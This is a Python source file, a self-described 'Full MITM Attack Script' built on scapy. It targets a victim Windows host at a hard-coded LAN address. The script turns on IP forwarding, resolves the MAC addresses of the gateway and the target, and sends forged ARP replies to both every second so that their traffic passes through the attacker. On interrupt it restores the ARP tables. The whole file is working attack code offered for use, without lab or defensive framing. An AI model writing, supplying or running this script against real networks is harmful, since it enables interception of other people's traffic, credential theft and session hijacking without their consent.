from scapy.all import ARP, Ether, sendp, getmacbyip, conf
import time
import os
import sys

# ── CONFIG ──
gateway_ip = "192.168.1.1"
target_ip  = "192.168.1.16"       # Windows host (victim)

print("[*] Full MITM Attack Script")
print(f"[*] Gateway: {gateway_ip}")
print(f"[*] Target:  {target_ip}")
print()

# ── Step 1: Enable IP forwarding (so traffic still flows through us) ──
print("[+] Enabling IP forwarding...")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# ── Step 2: Get real MAC addresses ──
print("[+] Resolving MAC addresses...")
gateway_mac = getmacbyip(gateway_ip)
target_mac  = getmacbyip(target_ip)

if not gateway_mac:
    print("[!] Could not find gateway MAC. Check gateway IP.")
    sys.exit(1)
if not target_mac:
    print("[!] Could not find target MAC. Check target IP.")
    sys.exit(1)

my_mac = conf.iface.mac

print(f"    Gateway MAC: {gateway_mac}")
print(f"    Target MAC:  {target_mac}")
print(f"    Our MAC:     {my_mac}")
print()

# ── Step 3: Build ARP poison packets (both directions) ──

# Tell the TARGET that WE are the GATEWAY
poison_target = Ether(dst=target_mac) / ARP(
    op=2,
    psrc=gateway_ip,
    pdst=target_ip,
    hwsrc=my_mac,
    hwdst=target_mac
)

# Tell the GATEWAY that WE are the TARGET
poison_gateway = Ether(dst=gateway_mac) / ARP(
    op=2,
    psrc=target_ip,
    pdst=gateway_ip,
    hwsrc=my_mac,
    hwdst=gateway_mac
)

# ── Step 4: Attack loop ──
print("[*] MITM attack started! Press Ctrl+C to stop.")
print("[*] Poisoning both directions every 1 second...\n")

try:
    count = 0
    while True:
        sendp(poison_target, verbose=False)
        sendp(poison_gateway, verbose=False)
        count += 1
        print(f"  [Packet #{count}] Poisoning target + gateway...")
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[*] Stopping attack...")
    print("[*] Restoring ARP tables...\n")

    # Restore real ARP entries
    restore_target = Ether(dst=target_mac) / ARP(
        op=2, psrc=gateway_ip, pdst=target_ip,
        hwsrc=gateway_mac, hwdst=target_mac
    )
    restore_gateway = Ether(dst=gateway_mac) / ARP(
        op=2, psrc=target_ip, pdst=gateway_ip,
        hwsrc=target_mac, hwdst=gateway_mac
    )

    for i in range(5):
        sendp(restore_target, verbose=False)
        sendp(restore_gateway, verbose=False)

    # Disable IP forwarding
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    print("[+] ARP tables restored. IP forwarding disabled.")
    print("[*] Attack stopped cleanly.")